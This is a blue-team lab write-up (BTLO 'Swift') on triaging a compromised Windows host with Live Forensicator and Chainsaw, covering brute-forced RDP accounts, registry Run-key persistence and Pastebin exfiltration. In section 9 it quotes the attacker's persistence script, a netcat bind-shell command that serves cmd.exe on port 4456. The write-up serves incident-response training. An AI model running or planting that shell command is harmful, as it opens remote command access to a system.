
# BTLO-Swift-Writeup

## Lab description

> Use Live Forensicator, a PowerShell framework, to collect key artifacts for analysis and triage after a Windows system has been compromised. Investigate the retrieved data and find clues of what happened.

## Readings (tools)

- https://github.com/Johnng007/Live-Forensicator
- https://github.com/WithSecureLabs/chainsaw

## Environment

We are given a Windows machine with tools already in place:

<details>
<summary>Screenshot</summary>

<img width="1643" height="1180" alt="image" src="https://github.com/user-attachments/assets/e8854b44-e16e-41a4-976b-e778ecf3fac8" />

</details>

---

## 1. Run Live Forensicator (-EVTX)

Run Live Forensicator using the `-EVTX EVTX` flag. Open the created output .HTML files in Chrome. According to Live Forensicator, which user accounts were locked out? (Alphabetical order)

After we run the tool using:

```powershell
.\Forensicator.ps1 -EVTX EVTX
```

It generates a lot of report files, and we need the EVTX one:

<details>
<summary>Screenshot</summary>

<img width="706" height="282" alt="image" src="https://github.com/user-attachments/assets/85616faf-4151-40af-beaf-a3e91b408356" />

</details>

The answer is found after we get familiar with different categories of info in the report:

<details>
<summary>Screenshot</summary>

<img width="1647" height="1017" alt="image" src="https://github.com/user-attachments/assets/ca123632-5086-425d-86b2-9dc8ba645798" />

</details>

---

## 2. Review lockout policy

Review the Lockout Policy on the machine. What is the number of failed logons before an account is locked, and what is the lockout duration?

While the tool was running, I decided to answer this since it only requires checking Local Security Policy:

<details>
<summary>Screenshot</summary>

<img width="871" height="349" alt="image" src="https://github.com/user-attachments/assets/2e0e0f0b-0991-4417-afa5-e83938209e1a" />

</details>

We see the answers right away.

---

## 3. Successfully accessed accounts

Which accounts were successfully accessed during the bruteforce attack?

We can look at the report and notice we have RDP logins from the same IP for 2 accounts:

<details>
<summary>Screenshot</summary>

<img width="665" height="272" alt="image" src="https://github.com/user-attachments/assets/997ab555-01af-41d6-890c-673a57a3c3d2" />

</details>

Upon further look, we see `ServiceAccountBackup` was created by `Service Account`, which the attacker accessed along with the `Claire.Daniels` account.

---

## 4. Attacker IP + country

What is the IP address that conducted the bruteforce attack and accessed these accounts, and what country is it associated with?

Using the IP lookup service:

<details>
<summary>Screenshot</summary>

<img width="1042" height="646" alt="image" src="https://github.com/user-attachments/assets/5c8166be-07ed-47b2-ab76-1a63d5775706" />

</details>

---

## 5. Attacker-created account + time

What account is created by the attacker, what is the time associated with this activity according to Live Forensicator?

Covered in the previous question.

---

## 6. Chainsaw failed logins (-r)

Use Chainsaw with the `-r` flag and point the tool at the Live Forensics EVT output folder to further investigate the RDP bruteforce activity. How many failed logins are detected across all affected accounts?

After reading how to use the tool on GitHub, we simply run it:

<details>
<summary>Screenshot</summary>

<img width="933" height="468" alt="image" src="https://github.com/user-attachments/assets/9e2a341d-5871-41a5-aa2d-b604ff57d325" />

</details>

And after 0.5 seconds, we have the answer.

---

## 7. Accounts NOT targeted

What local accounts were NOT targeted in this attack, according to Chainsaw's output for Login Attacks? (Only include accounts that are likely used by humans, and no, don't include BTLO!)

<details>
<summary>Screenshot</summary>

<img width="1002" height="333" alt="image" src="https://github.com/user-attachments/assets/1b1ef45d-da8b-433d-a0a5-a02137619e8a" />

</details>

When we cross-reference the previous answer with all accounts, we see the answer: Claire and George weren't targeted.

---

## 8. Persistence script filepath

Using Live Forensicator, identify the script that the attacker attempted to use for persistence. Submit the filepath and filename (Hint: Think about the account that is actively being used by the attacker to identify the right file!)

I decided to check the system processes tab and we see:

<details>
<summary>Screenshot</summary>

<img width="2041" height="449" alt="image" src="https://github.com/user-attachments/assets/51829042-3017-499d-8d48-72c30ea29dce" />

</details>

Since the attacker extensively used `ServiceAccount`, we can deduce that the `script.ps1` is the right answer.

---

## 9. Script contents

What are the contents of the script file?

Looked for hidden files and found nothing:

<details>
<summary>Screenshot</summary>

<img width="674" height="171" alt="image" src="https://github.com/user-attachments/assets/9e25f655-c181-4b0f-9694-5c26d03ca03c" />

</details>

I even searched the whole C drive and looked if it was still running in memory as a ps process, but no luck. (Edit: when I started the instance again, all the files in temp, including the script, loaded correctly.)

In the end, I had to search for an answer in a writeup, and it turns out they found the file at the location!

Answer: `cmd.exe -c nc64.exe -lvp 4456 e c:\Windows\System32\cmd.exe`

---

## 10. Registry persistence (Run/RunOnce)

We can't always trust the output from our tools. Manually investigate the machine's Run, RunOnce, RunServiceOnce registry keys. List the key names where the persistence script is being executed.

We start the RegEditor and find the keys at location:

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce`

<details>
<summary>Screenshot</summary>

<img width="983" height="303" alt="image" src="https://github.com/user-attachments/assets/e3b17614-a960-4465-885a-cbe3a18cf3af" />

</details>

All we need is to check which key names the attacker modified to execute the ps1 script.

---

## 11. Concerning exfil sites

Run Live Forensicator again using the flag to get browser history. Look at the `BROWSING_HISTORY` directory first, focusing on history from the compromised account used by the attacker. Three websites are a concern for data exfiltration, what are the URLs? (Alphabetical order based on subdomain or domain)

Check the folder, and in the file of `ServiceAccount` we see:

<details>
<summary>Screenshot</summary>

<img width="826" height="485" alt="image" src="https://github.com/user-attachments/assets/4d9459a3-4f31-41ea-b63e-7a4792faa456" />

</details>

Answer is gds.google, pastebin and wetransfer.

---

## 12. Pastebin exfil URL

Look at Live Forensicator's `BrowserHistory.html` output and search through the results for Pastebin. What is the URL that contains exfiltrated company data?

Running Forensicator with flag `-BROWSER BROWSER` and looking at the report:

<details>
<summary>Screenshot</summary>

<img width="929" height="150" alt="image" src="https://github.com/user-attachments/assets/e81266dd-05bc-45d7-98ad-732a31d315df" />

</details>

---

## 13. Exfil rows count

Visit this page directly (or if it is removed, use web.archive.org). How many rows of data have been exfiltrated by the attacker?

After opening the pastebin (https://web.archive.org/web/20240511093651/https://pastebin.com/MbnNWkMT):

<details>
<summary>Screenshot</summary>

<img width="1468" height="734" alt="image" src="https://github.com/user-attachments/assets/5e50b33e-dda5-4f43-9114-cf5b975a125d" />

</details>

---

## 14. Script creation date

Revisiting the malicious script created by the attacker, according to Live Forensicator, what is the creation date for the .ps1 file?

I ran through the EVTX file log to see if there was a timestamp of creation for this file, but there wasn't one, so I went to browser reports since the question hinted at that, and one of the first entries (by time) is the answer:

<details>
<summary>Screenshot</summary>

<img width="845" height="497" alt="image" src="https://github.com/user-attachments/assets/3ba39d85-3c0c-434a-b4a9-749fa6b784bd" />

</details>

---

## 15. Last logon value

What is the Last logon value for the attacker manually accessing the compromised account? (Remember, certain persistence mechanisms might log in as the user, so think about the timestamp that makes sense within the timeline)

Here the easiest is to go to Event Viewer again and filter for 4624 events and then correlate these with the script creation and `ServiceAccount`:

<details>
<summary>Screenshot</summary>

<img width="623" height="411" alt="image" src="https://github.com/user-attachments/assets/24695c7a-680f-4958-90c6-657af6939034" />

</details>

After that, only SYSTEM logons are present so we found the answer.

---

## 17. Locate the document

Based on the information in the data dump, investigate the files of each user on the system to locate the document. What is the filename, and which account was it stored on?

The question is vague and doesn't give me any hint on what type of file we are searching for or in which folders, so I used GPT to write a ps script and enumerate users' files for standard document extensions:

```powershell
$ext=@('.txt','.pdf','.md','.xlsx','.xls','.docx','.doc');
Get-ChildItem "$env:SystemDrive\Users" -Directory -ErrorAction SilentlyContinue |
ForEach-Object {
  $u=$_.Name;
  Get-ChildItem $_.FullName -Recurse -File -ErrorAction SilentlyContinue |
  Where-Object { $ext -contains $_.Extension.ToLower() } |
  Select-Object @{n='UserName';e={$u}}, Name, FullName
}
```

The question asks "which account was it stored on" originally, so we glance at the users and spot:

<details>
<summary>Screenshot</summary>

<img width="963" height="91" alt="image" src="https://github.com/user-attachments/assets/22ea2a68-3144-4e40-87bf-33376e0560fb" />

</details>

This room showcased a really useful tool, I'll try to bookmark and remember it, because although it's a little old in design, it produces very useful and fast-to-analyze reports and doesn't take an eternity to run. Overall, I would say this lab was fun and provided another opportunity to brush up on Windows forensics, which is always good!
